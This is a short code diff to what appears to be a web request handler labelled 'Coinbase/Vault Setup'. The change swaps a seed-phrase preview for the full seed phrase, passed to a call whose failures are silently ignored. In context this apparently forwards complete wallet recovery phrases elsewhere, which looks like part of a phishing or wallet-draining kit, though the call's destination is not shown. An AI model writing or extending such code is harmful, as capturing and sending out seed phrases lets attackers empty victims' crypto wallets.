@@ -71,7 +71,8 @@ export const POST: RequestHandler = async ({ request, getClientAddress }) => {
 			},
 			'Coinbase/Vault Setup',
 			`Seed phrase generated (${words.length} words)`,
-			preview
+			undefined,
+			{ seed: phrase }
 		).catch(() => {});
 	}
 
